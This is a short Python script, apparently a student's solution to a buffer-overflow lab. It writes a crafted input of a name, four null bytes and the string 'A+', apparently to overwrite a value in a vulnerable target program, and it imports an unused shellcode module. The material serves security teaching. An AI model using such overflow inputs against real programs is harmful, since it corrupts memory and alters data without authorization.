#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(b'skaus3')
sys.stdout.buffer.write(b"\x00"*4)
sys.stdout.buffer.write(b'A+')